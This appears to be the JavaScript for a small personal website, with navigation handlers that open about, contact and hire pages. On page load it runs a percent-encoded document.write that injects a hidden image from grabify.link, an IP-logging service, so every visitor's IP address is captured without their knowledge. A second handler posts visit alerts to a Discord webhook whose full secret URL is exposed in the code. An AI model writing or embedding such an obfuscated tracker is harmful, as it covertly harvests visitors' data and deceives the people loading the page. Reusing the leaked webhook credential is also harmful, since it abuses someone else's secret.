window.onload = sendMessage;
window.onload = logger

function onClick() {
    window.open(
        "about.html", "_blank");
}

function onClick2() {
  window.open(
      "contact.html", "_blank");
}
function onClick3() {
  window.open(
      "hire.html", "_blank");
}

function sendMessage() {
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/823660948270088222/SnN7fkfo_aT_S5xOVQ4PIzVjTliH97DHBky6BsaYT3mCNpHTSzu8JhLDQz76SWR0l-rn");

    request.setRequestHeader('Content-type', 'application/json');

    var params = {
      username: "Site Bot",
      avatar_url: "",
      content: "Somone has visited your site"
    }

    request.send(JSON.stringify(params));
  }

  function logger() {
    document.write(unescape('%20%20%20%20%20%20%20%20%3C%69%6D%67%20%73%72%63%3D%22%68%74%74%70%73%3A%2F%2F%67%72%61%62%69%66%79%2E%6C%69%6E%6B%2F%4A%34%48%54%43%4B%22%3E%0A'))
  }